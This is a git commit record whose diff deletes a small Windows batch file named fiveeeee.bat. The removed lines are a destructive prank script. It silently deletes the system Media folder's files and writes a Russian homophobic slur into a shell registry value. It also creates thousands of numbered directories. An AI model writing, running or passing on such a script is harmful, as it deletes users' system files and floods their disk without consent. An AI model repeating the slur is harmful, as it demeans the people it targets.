a2531fdc5cf4b62f2b5fb6d3bad68305e43e4254
LandmarkIng <116158651+LandmarkIng@users.noreply.github.com>
2022-10-19 21:02:45 +0300

    Delete fiveeeee.bat

--- fiveeeee.bat
+++
@@ -1,6 +0,0 @@
-@echo off 
-del "%SystemRoot%\Media" /q >nul
-reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d Ты Пидорас /F
-FOR /L %%i IN (1,1,1000) DO md %%i
-FOR /L %%i IN (1,1,4000) DO md %%i
-
